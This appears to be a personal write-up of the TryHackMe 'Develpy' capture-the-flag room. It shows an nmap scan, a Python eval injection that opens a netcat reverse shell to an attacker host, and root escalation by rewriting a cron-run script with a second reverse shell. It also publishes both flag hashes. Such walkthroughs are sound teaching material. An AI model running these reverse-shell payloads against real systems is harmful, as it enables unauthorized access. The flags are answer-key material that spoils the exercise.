<h1 align="center">Develpy</h1>
<p align="center"> <img width="160px" src="https://github.com/user-attachments/assets/1ca89a64-9b14-40a3-86ab-6a7979d90269"><br>
Jun 4, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure,<br>
part of my 394-day-streak in  <a href="https://tryhackme.com">TryHackMe</a><br>
boot2root machine for FIT and bsides Guatemala CTF <a href="https://tryhackme.com/room/bsidesgtdevelpy"</a>here.<br><br>
<img width="1000px" src="https://github.com/user-attachments/assets/e9be1861-90dc-467d-8c3e-47542f7b3c61"></p>

<br>
<h2>Task 1 . Develpy</h2>
<p>read user.txt and root.txt</p>

<h3 align="left">Answer the questions below</h3>

> 1.1. <em>user.txt</em><br><a id='1.1'></a>
>> <strong><code>cf85ff769cfaaa721758949bf870b019</code></strong><br>
<p></p>

<br>

> 1.2. <em>root.txt</em><br><a id='1.2'></a>
>> <strong><code>9c37646777a53910a347f387dce025ec</code></strong><br>
<p></p>

<br>

<br>

```bash
nmap 10.10.91.75
...
PORT      STATE SERVICE
22/tcp    open  ssh
10000/tcp open  snet-sensor-mgmt
...
```

<br>

![image](https://github.com/user-attachments/assets/5a4c465e-c134-4c7b-b839-e036ed53a1a2)

<br>

![image](https://github.com/user-attachments/assets/78a90f16-8859-414a-9c07-a84f0873372a)

<br>

![image](https://github.com/user-attachments/assets/96231f1e-2d9e-43aa-9df8-a167de1440b3)

<br>


```bash
nc -nlvp 4444
```

<br>

```bash
eval('__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.213.153 4444 >/tmp/f")')
```

![image](https://github.com/user-attachments/assets/6456c984-88c7-4e38-9d5f-ead07a842d76)

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444

Connection received on 10.10.91.75 43560
/bin/sh: 0: can't access tty; job control turned off
$ $ python -c 'import pty; pty.spawn("/bin/bash")'
king@ubuntu:~$ export TERM=xterm
export TERM=xterm
king@ubuntu:~$ ls
ls
credentials.png  exploit.py  root.sh  run.sh  user.txt
king@ubuntu:~$ cat user.txt
cat user.txt
cf85ff769cfaaa721758949bf870b019
king@ubuntu:~$ 

...
```

<br>

![image](https://github.com/user-attachments/assets/9aaa8f48-3ae4-4572-9c4c-42e425ae87c2)


<br>

```bash
king@ubuntu:~$ cat root.sh
cat root.sh
python /root/company/media/*.py
king@ubuntu:~$ ls -la
ls -la
total 324
drwxr-xr-x 4 king king   4096 Aug 27  2019 .
drwxr-xr-x 3 root root   4096 Aug 25  2019 ..
-rw------- 1 root root   2929 Aug 27  2019 .bash_history
-rw-r--r-- 1 king king    220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 king king   3771 Aug 25  2019 .bashrc
drwx------ 2 king king   4096 Aug 25  2019 .cache
-rwxrwxrwx 1 king king 272113 Aug 27  2019 credentials.png
-rwxrwxrwx 1 king king    408 Aug 25  2019 exploit.py
drwxrwxr-x 2 king king   4096 Aug 25  2019 .nano
-rw-rw-r-- 1 king king      5 Jun  4 11:32 .pid
-rw-r--r-- 1 king king    655 Aug 25  2019 .profile
-rw-r--r-- 1 root root     32 Aug 25  2019 root.sh
-rw-rw-r-- 1 king king    139 Aug 25  2019 run.sh
-rw-r--r-- 1 king king      0 Aug 25  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 king king     33 Aug 27  2019 user.txt
-rw-r--r-- 1 root root    183 Aug 25  2019 .wget-hsts
king@ubuntu:~$ 
```

<br>


```bash
nc -nlvp 1234
```

```bash
king@ubuntu:~$ rm root.sh
rm root.sh
rm: remove write-protected regular file 'root.sh'? y
y
king@ubuntu:~$ touch root.sh
touch root.sh
king@ubuntu:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.213.153 1234 >/tmp/f" >> root.sh
...
king@ubuntu:~$ touch root.sh
```

![image](https://github.com/user-attachments/assets/dee3ce47-f67e-4784-801b-cb5f17584be8)

<br>


![image](https://github.com/user-attachments/assets/1d62f248-3f5f-4d1b-a663-12bdaff8fa46)

<br>

```bash
# cd /root
# ls
company
root.txt
# cat root.txt
9c37646777a53910a347f387dce025ec
# 
```


<br>
<br>


<h1 align="center">Room Completed</h1>
<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/a1b0aa51-9820-40b3-95e7-221e7c64813b"><br>
<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/ee9ae759-f232-45fb-a352-5ba4875dddc9"></p>
                   
<h1 align="center">My TryHackMe Journey</h1>


<div align="center">

| Date<br>          |  Streak<br>|   All Time<br>Global   |   All Time<br>Brazil |  Monthly<br>Global   |  Monthly<br>Brazil   |  SHOGUN<br>points  |   Rooms<br>completed  |  Badges<br> |
| :---------------: | :--------: | :--------------------: | :------------------: | :------------------: | :------------------: | :----------------: | :-------------------: | :---------: |
| Jun 4, 2025       |     394    |          201ˢᵗ         |            4ᵗʰ       |        5,438ᵗʰ       |         89ᵗʰ        |       106,151      |             763       |    62       |

</div>

![image](https://github.com/user-attachments/assets/d763d287-f2b4-4119-b079-68fb2df6bd80)


<p align="center"> Global All Time: 201ˢᵗ <br><img width="300px" src="https://github.com/user-attachments/assets/80dea5ea-6ead-463a-bdc9-23ee72e5876c" alt="Your Image Badge"><br>
                                              <img width="1000px" src="https://github.com/user-attachments/assets/2b8f7fd7-8835-42a3-bd43-0ca907d2a5c0"><br><br>
                   Brazil All Time:   4ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/798dab77-2dfb-4436-89aa-625db5179ae8"><br><br>
                   Global monthly: 5,438ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/3798c178-9f25-4ba0-99ec-c8598b23a299"><br><br>
                   Brazil monthly:   89ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/d763d287-f2b4-4119-b079-68fb2df6bd80"><br><br></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
<br><br>
<h1 align="center">Thank you very much stuxnet for developinng this experience so that I could sharpen my skills!</h1>
